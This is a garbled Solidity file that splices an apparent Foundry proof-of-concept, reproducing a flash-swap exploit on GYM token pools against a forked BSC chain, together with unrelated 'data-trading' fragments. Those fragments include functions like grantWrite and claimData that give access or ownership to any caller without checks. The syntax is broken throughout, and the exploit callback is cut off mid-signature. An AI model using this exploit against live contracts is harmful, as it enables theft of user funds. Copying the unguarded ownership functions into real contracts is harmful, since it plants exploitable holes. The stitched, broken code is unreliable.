
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity 0.8.10;

;
;
contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  IPancakeRouter pancakeRouter =;
    IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
  ILiquidityMigrationV2 liquidityMigrationV2 =;
    ILiquidityMigrationV2(payable(0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4));
  IPancakePair wbnbBusdPair =;
    IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
  IPancakePair wbnbGymPair =;
    IPancakePair(0x8dC058bA568f7D992c60DE3427e7d6FC014491dB);
  IPancakePair wbnbGymnetPair =;
    IPancakePair(0x627F27705c8C283194ee9A85709f7BD9E38A1663);
  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  IERC20 gym = IERC20(0xE98D920370d87617eb11476B41BF4BE4C556F3f8);
  IERC20 gymnet = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);
  constructor() {
    cheat.createSelectFork("bsc",
      16798806);
    wbnb.approve(address(pancakeRouter), type(uint256).max);
    gym.approve(address(pancakeRouter), type(uint256).max);
    gymnet.approve(address(pancakeRouter), type(uint256).max);
    wbnbGymPair.approve(address(pancakeRouter), type(uint256).max);
    wbnbGymPair.approve(address(liquidityMigrationV2), type(uint256).max);
    wbnbGymnetPair.approve(address(pancakeRouter), type(uint256).max)};
  function testExploit() public {
    payable(address(0)).transfer(address(this).balance);
    emit log_named_uint("Before exploit, USDC  balance of attacker:",
      wbnb.balanceOf(msg.sender));
    wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));
    emit log_named_uint("After exploit, USDC  balance of attacker:",
      wbnb.balanceOf(msg.sender))};
  function pancakeCall(address sender,
    uint256 amount0
function grantWrite(string memory path) public {
    accessControl[path] = msg.sender}
function claimData(bytes32 dataId) public {
    dataOwners[dataId] = msg.sender}